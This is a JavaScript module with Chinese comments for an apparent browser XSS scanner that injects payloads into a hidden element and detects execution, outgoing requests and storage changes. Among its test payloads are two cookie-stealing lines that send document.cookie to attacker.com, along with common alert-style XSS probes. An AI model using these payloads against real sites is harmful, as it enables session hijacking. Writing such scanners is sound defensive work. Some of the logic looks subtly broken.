class VulnerabilityVerifier {
    constructor() {
        this.verificationMethods = {
            dom: this.verifyDOM.bind(this),
            network: this.verifyNetwork.bind(this),
            storage: this.verifyStorage.bind(this)
        };

        this.verificationPayloads = {
            dom: [
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<script>alert(1)</script>',
                '<div onmouseover=alert(1)>hover me</div>'
            ],
            network: [
                '<img src="http://attacker.com/steal?cookie=' + document.cookie + '">',
                '<script>fetch("http://attacker.com/steal?cookie=" + document.cookie);</script>',
                '<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">'
            ],
            storage: [
                '<script>localStorage.setItem("xss", "1");</script>',
                '<script>sessionStorage.setItem("xss", "1");</script>',
                '<script>document.cookie = "xss=1";</script>'
            ]
        };

        this.severityLevels = {
            critical: {
                threshold: 0.9,
                description: 'Critical vulnerability - Immediate action required'
            },
            high: {
                threshold: 0.7,
                description: 'High severity vulnerability - Urgent attention needed'
            },
            medium: {
                threshold: 0.5,
                description: 'Medium severity vulnerability - Should be addressed'
            },
            low: {
                threshold: 0.3,
                description: 'Low severity vulnerability - Consider addressing'
            }
        };
    }

    // 验证漏洞
    async verifyVulnerability(payload, context) {
        const verification = {
            success: false,
            type: null,
            severity: null,
            evidence: [],
            recommendations: []
        };

        try {
            // 根据上下文选择验证方法
            const method = this.selectVerificationMethod(context);
            if (!method) {
                verification.evidence.push('No suitable verification method found');
                return verification;
            }

            // 执行验证
            const result = await this.verificationMethods[method](payload, context);
            
            if (result.success) {
                verification.success = true;
                verification.type = result.type;
                verification.severity = this.calculateSeverity(result);
                verification.evidence = result.evidence;
                verification.recommendations = this.generateRecommendations(result);
            } else {
                verification.evidence = result.evidence;
            }
        } catch (error) {
            verification.evidence.push(`Verification error: ${error.message}`);
        }

        return verification;
    }

    // 选择验证方法
    selectVerificationMethod(context) {
        if (context.type.name === 'html') {
            return 'dom';
        } else if (context.type.name === 'javascript') {
            return 'network';
        } else if (context.type.name === 'css') {
            return 'storage';
        }
        return null;
    }

    // DOM验证
    async verifyDOM(payload, context) {
        const result = {
            success: false,
            type: 'DOM',
            evidence: []
        };

        try {
            // 创建测试容器
            const container = document.createElement('div');
            container.style.display = 'none';
            document.body.appendChild(container);

            // 注入payload
            container.innerHTML = payload;

            // 检查执行结果
            const executed = await this.checkExecution(container);
            if (executed) {
                result.success = true;
                result.evidence.push('DOM manipulation successful');
            }

            // 清理测试容器
            document.body.removeChild(container);
        } catch (error) {
            result.evidence.push(`DOM verification error: ${error.message}`);
        }

        return result;
    }

    // 网络验证
    async verifyNetwork(payload, context) {
        const result = {
            success: false,
            type: 'Network',
            evidence: []
        };

        try {
            // 创建测试容器
            const container = document.createElement('div');
            container.style.display = 'none';
            document.body.appendChild(container);

            // 注入payload
            container.innerHTML = payload;

            // 监听网络请求
            const requests = await this.monitorNetworkRequests();
            if (requests.length > 0) {
                result.success = true;
                result.evidence.push('Network request detected');
                result.evidence.push(`Requests: ${JSON.stringify(requests)}`);
            }

            // 清理测试容器
            document.body.removeChild(container);
        } catch (error) {
            result.evidence.push(`Network verification error: ${error.message}`);
        }

        return result;
    }

    // 存储验证
    async verifyStorage(payload, context) {
        const result = {
            success: false,
            type: 'Storage',
            evidence: []
        };

        try {
            // 创建测试容器
            const container = document.createElement('div');
            container.style.display = 'none';
            document.body.appendChild(container);

            // 注入payload
            container.innerHTML = payload;

            // 检查存储
            const storageModified = await this.checkStorageModification();
            if (storageModified) {
                result.success = true;
                result.evidence.push('Storage modification detected');
            }

            // 清理测试容器
            document.body.removeChild(container);
        } catch (error) {
            result.evidence.push(`Storage verification error: ${error.message}`);
        }

        return result;
    }

    // 检查执行结果
    async checkExecution(container) {
        return new Promise((resolve) => {
            let executed = false;
            
            // 设置超时
            const timeout = setTimeout(() => {
                resolve(false);
            }, 5000);

            // 监听alert
            const originalAlert = window.alert;
            window.alert = () => {
                executed = true;
                clearTimeout(timeout);
                resolve(true);
            };

            // 触发事件
            const events = ['load', 'error', 'mouseover', 'mouseout'];
            for (const event of events) {
                container.dispatchEvent(new Event(event));
            }

            // 恢复原始alert
            setTimeout(() => {
                window.alert = originalAlert;
            }, 100);
        });
    }

    // 监控网络请求
    async monitorNetworkRequests() {
        return new Promise((resolve) => {
            const requests = [];
            
            // 设置超时
            const timeout = setTimeout(() => {
                resolve(requests);
            }, 5000);

            // 监听fetch请求
            const originalFetch = window.fetch;
            window.fetch = async (...args) => {
                requests.push({
                    type: 'fetch',
                    url: args[0],
                    timestamp: new Date().toISOString()
                });
                return originalFetch.apply(window, args);
            };

            // 监听XHR请求
            const originalXHR = window.XMLHttpRequest;
            window.XMLHttpRequest = function() {
                const xhr = new originalXHR();
                const originalOpen = xhr.open;
                xhr.open = function(method, url) {
                    requests.push({
                        type: 'xhr',
                        method: method,
                        url: url,
                        timestamp: new Date().toISOString()
                    });
                    return originalOpen.apply(xhr, arguments);
                };
                return xhr;
            };

            // 恢复原始函数
            setTimeout(() => {
                window.fetch = originalFetch;
                window.XMLHttpRequest = originalXHR;
            }, 100);
        });
    }

    // 检查存储修改
    async checkStorageModification() {
        return new Promise((resolve) => {
            let modified = false;
            
            // 设置超时
            const timeout = setTimeout(() => {
                resolve(modified);
            }, 5000);

            // 监听localStorage
            const originalSetItem = localStorage.setItem;
            localStorage.setItem = function(key, value) {
                modified = true;
                return originalSetItem.apply(localStorage, arguments);
            };

            // 监听sessionStorage
            const originalSessionSetItem = sessionStorage.setItem;
            sessionStorage.setItem = function(key, value) {
                modified = true;
                return originalSessionSetItem.apply(sessionStorage, arguments);
            };

            // 监听cookie
            const originalCookie = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
            Object.defineProperty(document, 'cookie', {
                set: function(value) {
                    modified = true;
                    return originalCookie.set.call(document, value);
                },
                get: originalCookie.get
            });

            // 恢复原始函数
            setTimeout(() => {
                localStorage.setItem = originalSetItem;
                sessionStorage.setItem = originalSessionSetItem;
                Object.defineProperty(document, 'cookie', originalCookie);
            }, 100);
        });
    }

    // 计算严重程度
    calculateSeverity(result) {
        let severity = 'low';
        let score = 0;

        // 基于漏洞类型评分
        switch (result.type) {
            case 'DOM':
                score += 0.4;
                break;
            case 'Network':
                score += 0.3;
                break;
            case 'Storage':
                score += 0.3;
                break;
        }

        // 基于证据数量评分
        score += Math.min(result.evidence.length * 0.1, 0.3);

        // 确定严重程度
        for (const [level, config] of Object.entries(this.severityLevels)) {
            if (score >= config.threshold) {
                severity = level;
                break;
            }
        }

        return {
            level: severity,
            score: score,
            description: this.severityLevels[severity].description
        };
    }

    // 生成建议
    generateRecommendations(result) {
        const recommendations = [];

        // 基于漏洞类型的建议
        switch (result.type) {
            case 'DOM':
                recommendations.push({
                    type: 'security',
                    description: 'Implement proper DOM sanitization',
                    priority: 'high'
                });
                break;
            case 'Network':
                recommendations.push({
                    type: 'security',
                    description: 'Implement proper network request validation',
                    priority: 'high'
                });
                break;
            case 'Storage':
                recommendations.push({
                    type: 'security',
                    description: 'Implement proper storage access controls',
                    priority: 'medium'
                });
                break;
        }

        // 基于严重程度的建议
        if (result.severity.level === 'critical') {
            recommendations.push({
                type: 'urgency',
                description: 'Address this vulnerability immediately',
                priority: 'critical'
            });
        }

        return recommendations;
    }

    // 生成验证报告
    generateVerificationReport(result) {
        return {
            timestamp: new Date().toISOString(),
            success: result.success,
            type: result.type,
            severity: result.severity,
            evidence: result.evidence,
            recommendations: result.recommendations
        };
    }
}

export const vulnerabilityVerifier = new VulnerabilityVerifier(); 